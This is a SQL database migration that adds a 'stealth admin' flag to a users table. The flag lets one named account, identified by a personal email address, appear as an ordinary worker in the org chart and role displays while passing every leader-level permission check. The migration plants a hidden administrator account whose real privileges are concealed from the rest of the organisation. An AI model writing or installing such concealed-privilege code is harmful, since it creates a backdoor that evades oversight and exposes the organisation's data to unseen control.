-- Stealth admin flag: a user can have role='worker' (or anything else)
-- in the UI while still passing every leader-equivalent permission gate
-- under the hood. Public-facing surfaces (org chart, role chips, crown
-- icons) keep reading `role` directly; access helpers OR `is_admin`
-- into the leader check.
alter table public.users
  add column if not exists is_admin boolean not null default false;

create index if not exists users_is_admin_idx on public.users (is_admin)
  where is_admin = true;

-- Flip shaheerkhosa6@gmail.com into the stealth slot: looks like a
-- worker in Software, has leader powers.
update public.users
   set is_admin = true,
       role = 'worker'
 where email = 'shaheerkhosa6@gmail.com';
